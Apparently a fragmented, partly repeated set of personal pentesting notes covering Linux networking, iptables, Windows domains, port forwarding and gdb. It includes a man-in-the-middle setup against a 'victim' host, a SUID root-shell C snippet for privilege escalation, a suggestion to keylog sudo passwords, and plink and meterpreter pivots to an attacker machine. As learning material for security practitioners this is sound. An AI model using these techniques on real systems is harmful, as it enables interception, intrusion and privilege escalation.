empty. Like this: Destination Gateway Genmask Flags Metric Ref Use Iface But we have network interface connected, called eth0. If we now try to ping the router (the gateway) on the network, we get this result: ~ ping 192.168.2.1 connect: Network is unreachable At this point we can't even add a route to the gateway. Because the network is unreacheable. So we need to hook outselfs up to the network first. route add -net 192.168.2.0 netmask 255.255.255.0 dev eth0 Now our table looks like this: Destination Gateway Genmask Flags Metric Ref Use Iface 192.168.2.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0 We still can't ping anything out in the internetz- That's because we are not reaching our gateway (router), since we haven't configured it yet. route add default gw 192.168.2.1 or ip route add default via 192.168.2.1 Remember that these routes will only be temporary. Example - Man in the middle a host # It is often useful to man in the middle all traffic from a machine, to see what requests and stuff it does. Let's say that the scenario is that the victim-machine is connected to the mitm-machine by ethernet cable. This can be either a physical cable or thought a virtual machine. Victim machine On the victim machine we don't have network-manager installed. And out /etc/network/interfaces has nothing in it except for: auto lo iface lo inet loopback When we run ip addr we get the following result: root@deb64:~# ip a 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens3: <BROADCAST,MULTICAST> mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000 link/ether 12:34:00:a9:fc:4a brd ff:ff:ff:ff:ff:ff So our network interface ens3 does not have an ip-address and it is down. So let's first give it an ip-address, now remember that this ip-address will only be temporary, and will disappear on next reboot. If you want to make it permanent you need to define it in /etc/network/interface Give interface an ip-address ip addr add 192.168.150.2/24 dev ens3 # Here we give it the ip-address 192.168.150.2 with netmask 255.255.255.0 (/24), and we # give it to the device/interface ens3 Now we can start the interface, or \"bring it up\" as it is called: ip link set ens3 up # ifup and ifdown will not work When we bring up the interface the routing table will automatically get populated. root@deb64:~# ip r 192.168.150.0/24 dev ens3 proto kernel scope link src 192.168.150.2 Add default gateway But we are still not able to reach the internet since we have not defined a default gateway yet. So let's do that. ip route add default via 192.168.150.1 dev ens3 If we look at the routing table now we can see our new default gateway. root@deb64:~# ip route default via 192.168.150.1 dev ens3 192.168.150.0/24 dev ens3 proto kernel scope link src 192.168.150.2 Now we are done setting up the victim machine. Attacking machine First we need to give our machine the ip-address of the default gateway, so that the victim will connect to the attacking machine. ip addr add 192.168.150.1/24 dev ens3 Now we just need to configure the NATing. iptables -t nat -A POSTROUTING -j ACCEPT This is all we have to do. If we now do a curl icanhazip.com from our victim machine, we can see the traffic flying by with tcpdump in our attacker-machine. However, we might want to inspect the traffic in burp-suite, or some other proxy tool. In ordet to do that we can redirect specific traffic into our proxy with the help of our friend iptables. iptables -t nat -A PREROUTING -i ens3 -s 192.168.150.2 -p tcp -m tcp --dport 443 -j REDIRECT --to-ports 8080 iptables -t nat -A PREROUTING -i ens3 -s 192.168.150.2 -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080 iptables -t nat -A PREROUTING -i ens3 -s 192.168.150.2 -p tcp -m tcp --dport 53 -j REDIRECT --to-ports 53 Now we just have to configure burp-suite a little bit. Go to Proxy > Options > Proxy Listeners > Edit > Binding > All interfaces Go to: Proxy > Options > Proxy Listeners > Edit > Request handling > Support invisible proxy Now if you do the following from the victim machine: curl icanhazip.com You will see the request in burp suite. If you want to mitm windowsyou just need to change the ip and gateway to 192.168.15.2 and 192.168.150.1. Wireless - wpa_supplicant # So if you manage to disable networkManager you can connect to a wireless network using wpa_supplicant instead. I think that is what NetworkManager actually uses underneith. First we need to list all Access Points. sudo iwlist wlan0 scan Then we need to create a config-file for our specific access-point. We can do that with wpa_passphrase, after running the command we are asked to write the password, which also gets stored in the config file. In plaintext. wpa_passphrase NameOfWIfi > wpa.conf Now we just connect to the AP: wpa_supplicant -Dwext -iwlan0 -c/etc/wpa_supplicant/wpa.conf After this you do not have an IP-address, or you might not have a updated dhcp lease. So first you need to release the current lease. sudo dhclient wlan0 -r # Then get a new dhcp lease sudo dhclient wlan0 Now you should be able to surf the internetz. Netstat - Find outgoing and incoming connections # Netstat is a multiplatform tool. So it works on both mac, windows and linux. $ netstat -antlp Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 mymachine:domain *:* LISTEN - tcp 0 0 localhost:ipp *:* LISTEN - tcp 0 0 localhost:27017 *:* LISTEN - tcp 0 0 localhost:mysql *:* LISTEN - A few interesting things to observe here is that my machine is using any port over 1024 to connect to the outside. So it is not like just because we communicate with https and connect to port 443 that we use that port on our machine. On our machine it can be any port (over 1024) and usually any port over 10000. Find out what services are listening for connection on your machine Flags -a # All -n # show numeric addresses -p # show port -t # tcp netstat -anpt To easily check out what process is using lots of bandwidth you can use nethogs. sudo apt-get install nethogs nethogs Or you can use tcpdump, or iptables. Every listening process of course has a PID, but unless you are root you can't might not see them all. Firewall - Iptables # Iptables is a firewall tool in linux. A firewall is basically a tool that scans incoming and/or outgoing traffic. You can add rules to the iptables to filter for certain traffic. Types of chains # So you can filter traffic in three different ways input , forward , and output . These are called three different chains. INPUT This is for incoming connections. If someone wants to ssh into your machine. Or a web-server responds to your request. FORWARD This chain is used for traffic that is not aimed at your machine. A router for example usually just passes information on. Most connections are just passing through. As you can see this will probably not be used so much on your machine, as a normal desktop or a server doesn't router that much traffic. OUTPUT This chain is used for outgoing traffic. Active rules # To view your active rules you do iptables -L # It will output something like this Chain INPUT (policy ACCEPT) target prot opt source destination Chain FORWARD (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination So as we can see the current policy is to accept all traffic in all directions. If you for some reason has been tampering with the iptables and maybe fucked up. This is how you return it to the default setting, accepting all connections iptables --policy INPUT ACCEPT iptables --policy OUTPUT ACCEPT iptables --policy FORWARD ACCEPT If you instead want to forbid all traffic you do iptables --policy INPUT DROP iptables --policy OUTPUT DROP iptables --policy FORWARD DROP Okay, so let's block out some connections. To do that we want to add/append a new rule. We want to block all connections from our enemy 192.168.1.30. # A for append, and S for source. iptables -A INPUT -s 192.168.1.30 -j DROP # Block an entire range iptables -A INPUT -s 192.168.1.0/24 -j DROP Now if we want to see our current rules we just do iptables -L And we can now see our new rule. To add line-numbers for each rule, so that you can then specify which rule you want to reset or change or something you can output the rluels with line-numbers iptables -L -v --line-numbers Remove/delete a rule To remove a rule you just do # Remove one specific rule iptables -D INPUT 2 # Remove all rules iptables -F Save your changes Your changes will only be saved and therefore in action until you restart iptables. So they will disappear every time you reboot unless you save the changes. To save the changes on ubuntu you do sudo /sbin/iptables-save Measuring bandwidth usage # There are a few different tools in hour arsenal that we can use to measure bandwidth usage. We will start with iptables. To view the input and output traffic we just list the rules with some verbosity. iptables -L -v # Stdout Chain INPUT (policy ACCEPT 6382 packets, 1900K bytes) pkts bytes target prot opt in out source destination Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 4266 packets, 578K bytes) pkts bytes target prot opt in out source destination So clean this up and reset the count we can do the following # Restar the count iptables -Z # Remove all the rules, FLUSH them iptables -F So now we just need to add our rules. A simple script for this would be #!/bin/bash iptables -F iptables -I INPUT 1 -p tcp -j ACCEPT Then check out the traffc with iptables -L -v --line-numbers Examples # Block outgoing connections to a specific ip iptables -A OUTPUT -d 198.1.1.1 -j DROP https://www.digitalocean.com/community/tutorials/how-to-list-and-delete-iptables-firewall-rules Troubleshooting # Have you tried turning it on and off? # I have had problems with the network-adapter not starting or something like that, on Ubuntu. You can try to restart the network manager if this happens: sudo service network-manager restart Magical rfkill # If for some reason the wifi is blocked you can unblock it (or block it) with rfkill. $ rfkill list 0: phy0: Wireless LAN Soft blocked: no Hard blocked: no 2: hci0: Bluetooth Soft blocked: no Hard blocked: no To block or unblock the phy0 from the example above you do: # Block rfkill block 0 # Unblock rfkill unblock 0 If there is a hard block it means that there is a physical switch on you machine that you need to switch off. DNS # Another rather messy area is DNS. The reason for this is that we have a few different players here, /etc/resolv.conf , resolvconf , dnsmasq and the dreaded NetworkManager .

Standard streams are the streams that are used to interact between the human computer-user and the machine. There are three standard streams: standard input (stdin), standard output (stdout), and standard error (stderr).The stdin stream can be seen as an abstractions of the real keyboard input.

So the default Stdin comes from the STDIN-file that is a text-file representation of the keyboard input. But often times we do not want to input stuff from the keyboard, sometimes we want to input something into a program that comes from another file. That is when we can use redirection symbol: > .

In windows you usually have to google around and then click on random scary download buttons that might fuck up your computer, or not.

That is because distros have their own software repositories from where you can download your software. This is kind of like an app-store except everything is free. The different major branches of teh GNU/Linux OS have their own software repositories. Ubuntu has their own, debian has their own, and so on. Different distros also have their own package-amangers.

These are called three different chains. INPUT This is for incoming connections. If someone wants to ssh into your machine. Or a web-server responds to your request. FORWARD This chain is used for traffic that is not aimed at your machine. A router for example usually just passes information on. Most connections are just passing through. As you can see this will probably not be used so much on your machine, as a normal desktop or a server doesn't router that much traffic. OUTPUT This chain is used for outgoing traffic.","title":"Types of chains"},{"location":"basics_of_linux/basics_of_linux/#active-rules","text":"To view your active rules you do iptables -L # It will output something like this Chain INPUT (policy ACCEPT) target prot opt source destination Chain FORWARD (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination So as we can see the current policy is to accept all traffic in all directions. If you for some reason has been tampering with the iptables and maybe fucked up. This is how you return it to the default setting, accepting all connections iptables --policy INPUT ACCEPT iptables --policy OUTPUT ACCEPT iptables --policy FORWARD ACCEPT If you instead want to forbid all traffic you do iptables --policy INPUT DROP iptables --policy OUTPUT DROP iptables --policy FORWARD DROP Okay, so let's block out some connections. To do that we want to add/append a new rule. We want to block all connections from our enemy 192.168.1.30. # A for append, and S for source. iptables -A INPUT -s 192.168.1.30 -j DROP # Block an entire range iptables -A INPUT -s 192.168.1.0/24 -j DROP Now if we want to see our current rules we just do iptables -L And we can now see our new rule. To add line-numbers for each rule, so that you can then specify which rule you want to reset or change or something you can output the rluels with line-numbers iptables -L -v --line-numbers Remove/delete a rule To remove a rule you just do # Remove one specific rule iptables -D INPUT 2 # Remove all rules iptables -F Save your changes Your changes will only be saved and therefore in action until you restart iptables.

But these are the more common ones. Loan balancing # Well a load balancer principally works with load balancing. It initially receives traffic and then direct that traffic onward towards different instances/server of an app. So in order to increase the amount of traffic a webserver can handle you can just add a new instance of your app, and then tell the load balancer to direct the traffic to the new server as well. Without a load balancer the way to scale up the capacity of an application would be to buy a bigger server that can handle more traffic, not a very smooth way to scale an application. The group of servers that the load balancer directs the traffic to is usually called server farm or server pool . Load balancers can be roughly divided up n those that direct traffic on Layer 4 or Layer 7. Layer 4 load balancers act upon network traffic on layer 4, like IP, TCP, UDP. Layer 7 load balancers balance the traffic based on data found in the HTTP. It could be HTTP headers, or even URL Paths, or cookie. It is common to see when you remove the Load balancing Cookie that you get different responds. It could for example be that you are authenticated on one server, but not the other. Load balancers can assure the health of a server, in order to only direct a request to a server that is up and running. Common load balancers # The most common load balancers are F5 and Nginx. Also HA Proxy Nginx can also work as a webserver or a reverse proxy. It depends on how you configure it. Reverse proxy # From many to one. Deploying a load balancer make sense when you have multiple server. Deploying a reverse proxy in front of an application can provide some really nice features. Examples of such features are: IP whitelisting/blacklisting Limiting number of connetions from each client It can also increase the performance by doing the following: - Compression (GZIP compression - which decreases the amount of data that needs to be transfered) - SSL Terminatation - terminating can be computationally expensive. So it might be beneficial to have a reverse proxy doing that, instead of the web server, which might not be specialized to do that. - Caching - By caching certain content, it will reduce the traffic to the actual web server, and generate faster responses to the client. Common reverse proxies # F5 BIG-IP, Nginx Increased security. API Gateway # API gateway is usually used in order to route request to appropriate microservices. API gateways is usually used with microservices. It has the benefit that a client (or server) only needs to talk to one API server to get some data, instead of having to talk to 20 different microservices, which might be using different protocols.

Strictly speaking Linux is just the kernel in the GNU/Linux operating system. Linux is the most installed OS in the world, that is mainly due to the fact that android use Linux as its OS. It is leading in pretty much all markets except for the desktop-market. From a infosec perspective there are two reasons we should learn Linux. The first is that the majority of all servers in the world is running on Linux. And if we want to hack those servers we of course have to understand how they work. The second reason is that the vast majority of all hacking-tools are only available on Linux. So in this chapter we are going to look at bit at some basic commands and basics of Linux. Of course your can write quite a few books about Linux, so this tiny little introduction is just way to get you started. And also, I am just a beginner myself so I am just writing stuff that I myself need to learn. Although there is only one Linux Kernel there are many Linux Distributions, that is: different versions. That is because the GNU/Linux OS is a mix of GNU software and the Linux Kernel. The GNU/Linux OS can be packaged in a million different ways, with different software preinstalled, with different configurations, with different Graphical User Interface (GUI). The fact that you can configure the OS however you like has given rise to the many different versions. These different versions are usually called distros . There are hundreds of different distros. Some common ones are: Ubuntu, Debian, Redhat, CentOS and Arch. So you probably wonder what the main differences are. Here is a list of some differences: Package management program. Speed and interval of release Desktop environment Default GUI Community Compilation of the Linux Kernel So as you can see depending on the users needs you can choose the distro that fits you best. Some people want to have bleeding-edge (the latest updates - although a bit more unstable) and others prefer stability. Some people want a distro with higher degree of security. Others want a distro with only free software, others want distros specially made for kids, or for education, or for scientists. One distro that is common among pentesters is Kali Linux. It comes preinstalled with hundreds of different pentesting-related tools. It might not be the best distro for everyday use. But for pentesting is is really convenient.

One is using a server-client model called Domain and the other is through a peer-to-peer like model called Worksgroup . Windows domain # On Windows domain all users are connected to a domain controller. So when you log in to your machine it authenticates against the domain controller. This way it is ultimately the domain controller that decides security policy. Length of password, how often it should be changed, disabling accounts. If a users quits his/hers job you can just remove his/her account. The person in control over the domain controller is in control of the network. As a pentester you are most likely very interesting in gaining access the the domain controller with Administrator-privileges. That means you control the network. Since you authenticate against a domain controller you can log in to your account from any of the machines in the network. Think of systems you have had in schools and universities, where you can just sit down by any computer and log in to your account. This is usually a domain type network. In order to set up a Domain network you need at least one Windows server for the domain controller. If you have hacked a machine and you want to know if it is part of either a Workgroup or a domain you can do the following: go to Control panel/System . If it says Workgroup: something it means that the machine is connected to a workgroup, and not a domain. Active directory # From Windows 2000 and on the application Active directory has been program used for maintaining the central database of users and configurations. Domain controller # Any windows computer can be configured to be a domain controller. The domain controller manages all the security aspects of the interaction between user and domain. There are usually a least two computers configured to be domain-controllers. In case one breaks down. If you have compromised a machine that belong to a domain you can check if it has any users. DC:s don't have local users. If you run enum4linux you can look out for this section Nbtstat Information <1c> - <GROUP> B <ACTIVE> Domain Controllers A third way is to run this command echo %logonserver% SMB # On networks that are based on Linux and you need to integrate a windows machine you can use SMB to do that. Kerberos # Kerberos is a network authentication protocol. The original protocol is used by many unix-systems. Windows have their own version of the Kerberos protocol, so that it works with their NT-kernel. It is used by windows Domains to authenticate users. But kerberos can also be found in several unix-operating systems. Kerberos was not built by windows, but long before. I think a machine that has port 88 open (the default kerberos port) can be assumed to be a Domain Controller. When a user logs in to the domain Active Directory uses Kerberos to authenticate the user. When the user insert her password it gets one-way encrypted and sent with Kerberos to the Active directory, which then compares it with its password database. The Key Distribution Center responds with a TGI ticket to the user machine. Workgroup # A workgroup architecture stands in contrast to the domain-system. A workgroup is based on the idea of peer-to-peer and not server-client as domain is. In a domain network you have a server (domain controller) and a client (the user). Therefore it might be a bit hard to control a network bigger than a dozen clients. So it is usually used for smaller networks. If a computer is part of a workgroup it cannot be part of a domain. In a workgroup architecture each computer is in charge of its own security settings. So there is no single computer in charge of all the security settings for the workgroup. This is good because you don't have one single point of failure, bt is also bad because you have to trust the users to configure their machines securely. In a network you can have several workgroups. But that is usually not the case. In a workgroup users can see each other, and share files. User privileges # How does the user-system work on windows. System (user) # System is actually not a user per se. System is technically a security principle. One big difference between System and Administrator is that is the computer is connected to a domain the system user can access the domain in the context of the domain account. The administrator cannot. On windows it is possible to grant permission of a file to System but not to Administrator. One example of this is the SAM key, which contains local account information.

But what is really the registry? Well the windows registry is a hierarchical database that stores low-level settings used by the OS or any other application that uses it. The SAM (Security account manager) uses it, along with a lot of other stuff. There is not really any equivalent for the Registry in Linux. Most configurations are done in text-files in Linux.You can usually find the under /etc . Edit the registry # In Linux you usually just sudo-edit a config-file in /etc . In Windows you open Regedit and you can see the whole hierarchy. The registry is built with Key-value pairs. SAM # Drivers # You hear a lot of talk about drivers in the Windows ecosystem, but not in Linux. That is because in Linux the drivers are open-sourced and included in the kernel, for most part. These drivers might be produced by nice programmers or they could be developed by the hardware-producer themselves. That's why it is so easy and fast to install new hardware on Linux. If it is compatible that is. Drivers are software lets the OS communicate with the hardware. Like networks cards, graphics card, printers. To list all the drivers on the machine use the following command: driverquery This can we good to know since drivers can contains vulnerabilities that can be used for priv-esc. Check out the chapter on that. IIS - Windows web server # IIS stands for Internet Information Services (before it was Internet Information Server). The software is usually includede in most Windows versions, except for the home editions. The IIS version usually corresponds to the OS version.

It is a binary-file but it is not executable in itself, but it contains code that the executable calls. It is used to modularize the code of a program. In the windows operating system DLL files are shared among different applications. For example, the dll Comdlg32 is used to create dialog boxes. So different applications can invoke this library to easily create a dialog box. This promotes code reuse. So an application may use the standard windows DLL-files, but it may also bring its own DLL-files. So if one DLL-file is missing for a program a certain module might not work. As most Windows-users have sometime experienced. LIB # Lib is a bit like DLL, it is a library. But it is not dynamic as DLL. So lib-files are linked on compile-time. While dll-files are linked in run-time. Since lib-files are compiled into the executable you never see it (unless you are developing of course). But since DLL-files are dynamically loaded at run-time they are still around for the user to see.

As a pentester you are most likely very interesting in gaining access the the domain controller with Administrator-privileges. That means you control the network. Since you authenticate against a domain controller you can log in to your account from any of the machines in the network. Think of systems you have had in schools and universities, where you can just sit down by any computer and log in to your account. This is usually a domain type network. In order to set up a Domain network you need at least one Windows server for the domain controller. If you have hacked a machine and you want to know if it is part of either a Workgroup or a domain you can do the following: go to Control panel/System .

I think a machine that has port 88 open (the default kerberos port) can be assumed to be a Domain Controller. When a user logs in to the domain Active Directory uses Kerberos to authenticate the user.

In a workgroup architecture each computer is in charge of its own security settings. So there is no single computer in charge of all the security settings for the workgroup. This is good because you don't have one single point of failure, bt is also bad because you have to trust the users to configure their machines securely. In a network you can have several workgroups.

If you run a script signed by a publisher PowerShell hasn't seen before, PowerShell will ask whether you trust the script's publisher. RemoteSigned : PowerShell won't run scripts downloaded from the Internet unless they have a digital signature, but scripts not downloaded from the Internet will run without prompting. If a script has a digital signature, PowerShell will prompt you before it runs a script from a publisher it hasn't seen before. Unrestricted : PowerShell ignores digital signatures but will still prompt you before running a script downloaded from the Internet.

They might be even more vulnerable since the developer or user might be thinking \"since it is only accessible for the specific user we don't need to spend that much of security\".

There might be some interesting stuff there. But even if there isn't you might be able to exploit it. If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell. This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this: chmod 4777 exploit #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <unistd.h> int main() { setuid(0); system(\"/bin/bash\"); return 0; } Steal password through a keylogger # If you have access to an account with sudo-rights but you don't have its password you can install a keylogger to get it.

But someone has put some crazy firewall rules (egress filters) that prohibits outgoing traffics on all ports except for port 80. So how are we going to be able to connect to our ftp-server? What we can do is add a machine that redirect/forward all traffic that it receives on port 80 to port 21 on a different machine. So instead of having this kind of traffic home-computer/port-21 ----> ftp-server/port-21 we will have home-computer/port-80 ----> port-80/proxy-machine/port-21 ----> ftp-server And the other way around of course, to receive the traffic. Okay, so how do we go about actually implementing this? Rinetd - Port forward/redirect # So we can set up this port forwarding machine with the help of rinetd. To make it clear, we have the following machines: Machine1 - IP: 111.111.111.111 - Behind firewall, and wants to connect to Machine3. Machine2 - IP: 222.222.222.222 - Forwards incomming connections to Machine3 Machine3 - IP: 333.333.333.333 - Hosts the ftp-server that machine1 wants to connect to. apt-get install rinetd This is the default config file /etc/rinetd.conf : # # this is the configuration file for rinetd, the internet redirection server # # you may specify global allow and deny rules here # only ip addresses are matched, hostnames cannot be specified here # the wildcards you may use are * and ? # # allow 192.168.2.* # deny 192.168.2.1? # # forwarding rules come here # # you may specify allow and deny rules after a specific forwarding rule # to apply to only that forwarding rule # # bindadress bindport connectaddress connectport # logging information logfile /var/log/rinetd.log # uncomment the following line if you want web-server style logfile format # logcommon This is the essential part of the configuration file, this is where we create the port-forwarding # bindadress bindport connectaddress connectport 111.111.111.111 80 333.333.333.333 21 /etc/init.d/rinetd restart So the bind-address is where the proxy receieves the connection, and the connectaddress is the machine it forwards the connection to. SSH Tunneling - Port forwarding on SSH # Use cases - You want to encrypt traffic that uses unencrypted protocols. Like VNC, IMAP, IRC. - You are on a public network and want to encrypt all your http traffic. - You want to bypass firewall rules. Local port forwarding # Now facebook will be available on address localhost:8080. ssh -L 8080:www.facebook.com:80 localhost You can also forward ports like this: ssh username@<remote-machine> -L localport:target-ip:target-port ssh username@192.168.1.111 -L 5000:192.168.1.222:5000 Now this port will be available on your localhost. So you go to: nc localhost:10000 Remote port forwarding # Remote port forwarding is crazy, yet very simple concept. So imagine that you have compromised a machine, and that machine has like MYSQL running but it is only accessible for localhost. And you can't access it because you have a really crappy shell. So what we can do is just forward that port to our attacking machine. The steps are as following: Here is how you create a remote port forwarding: ssh <gateway> -R <remote port to bind>:<local host>:<local port> By the way, plink is a ssh-client for windows that can be run from the terminal. The ip of the attacking machine is 111.111.111.111 . Step 1 So on our compromised machine we do: plink.exe -l root -pw mysecretpassword 111.111.111.111 -R 3307:127.0.0.1:3306 Step 2 Now we can check netstat on our attacking machine, we should see something like this: tcp 0 0 127.0.0.1:3307 0.0.0.0:* LISTEN 19392/sshd: root@pt That means what we can connect to that port on the attacking machine from the attacking machine. Step 3 Connect using the following command: mysql -u root -p -h 127.0.0.1 --port=3307 Dynamic port forwarding # This can be used to dynamically forward all traffic from a specific application. This is really cool. With remote and local port forwarding you are only forwarding a single port. But that can be a hassle if your target machine has 10 ports open that you want to connect to. So instad we can use a dynamic port forwarding technique. Dynamic port forwarding sounds really complicated, but it is incredibly easy to set up. Just set up the tunnel like this. After it is set up do not run any commands in that session. # We connect to the machine we want to pivot from ssh -D 9050 user@192.168.1.111 Since proxychains uses 9050 by defualt (the default port for tor) we don't even need to configure proxychains. But if you want to change the port you can do that in /etc/proxychains.conf . proxychains nc 192.168.2.222 21 So supress all the logs from proxychains you can configure it in the config file. Tunnel all http/https traffic through ssh # For this we need two machines. Machine1 - 111.111.1111.111 - The server that works as our proxy. Machine2 - The computer with the web browser. First we check out what out public IP adress is, so that we know the IP address before and after, so we can verify that it works. First you set ssh to: # On Machine2 we run ssh -D localhost:9999 root@111.111.111.111 # Can also be run with the -N flag ssh -D localhost:9999 root@111.111.111.111 -N Now you go to Firefox/settings/advanced/network and SOCKS you add 127.0.0.1 and port 9999 Notice that this setup probably leaks DNS. So don't use it if you need opsec. To fix the DNS-leak you can go to about:config in firefox (in the addressbar) then look for network.proxy.socks_remote_dns , and switch it to TRUE . Now you can check: https://ipleak.net/ But we are not done yet. It still says that we have WebRTC leaks . In order to solve this you can go to about:config again and set the following to FALSE media.peerconnection.enabled SShuttle # I haven't used this, but it might work. sshuttle -r root@192.168.1.101 192.168.1.0/24 Port forward with metasploit # We can also forward ports using metasploit. Say that the compromised machine is running services that are only accessible from within the network, from within that machine. To access that port we can do this in meterpreter: portfwd add -l <attacker port> -p <victim port> -r <victim ip> portfwd add -l 3306 -p 3306 -r 192.168.222 Now we can access this port on our machine locally like this. nc 127.0.0.1 3306 Ping-sweep the network # First we want to scan the network to see what devices we can target.

We can set these breakpoints with the following command: Set a break at the main-function break main Set a break at that line.

This shows the code in assembly. It is pretty much the same as running objdump. disassemble main Show info about instruct pointer info register eip i r eip On 64bit machines it is called rip instead of eip . It basically shows to what address eip is pointing at. So the output might be something like this: (gdb) i r rip rip 0x4004aa 0x4004aa <main+4> Which means that rip at this moment is pointing at 0x4004aa. Which means that this is going to be the next instruct that gets executed. The structure is like this: examine/[format] address x/ Format is how you want to display the memory. Here are the following formats: o - octal x - hexadecimal d - decimal u - unsigned decimal t - binary f - floating point a - address c - char s - string i - instruction Example: x/s myVariable This means: examine myVariable, and output the content in that memory in the form of a string. Now this does not work for values that does not have a memory address. It will just give you ` 0x16: Cannot access memory at address 0x16 That is because the variable is not a pointer (it does not point to an memory-address), but instead it is a hardcoded value. x/i $rip Examine/info instruction pointer register. This command can be used to examine a specific part of memory. In this example it was the instruct pointer, but it can also be a specific address in memory. Show all functions # info funcions Python Python can be quite useful go generate strings as input. Of course this can be done with a lot of other languages. so it would work like this. ./myProgram $(python -c 'print \"\\x41\" * 30') Basically, the $(python) creates a shell within our command.

Here are the following formats: o - octal x - hexadecimal d - decimal u - unsigned decimal t - binary f - floating point a - address c - char s - string i - instruction Example: x/s myVariable This means: examine myVariable, and output the content in that memory in the form of a string. Now this does not work for values that does not have a memory address. It will just give you ` 0x16: Cannot access memory at address 0x16 That is because the variable is not a pointer (it does not point to an memory-address), but instead it is a hardcoded value. x/i $rip Examine/info instruction pointer register.
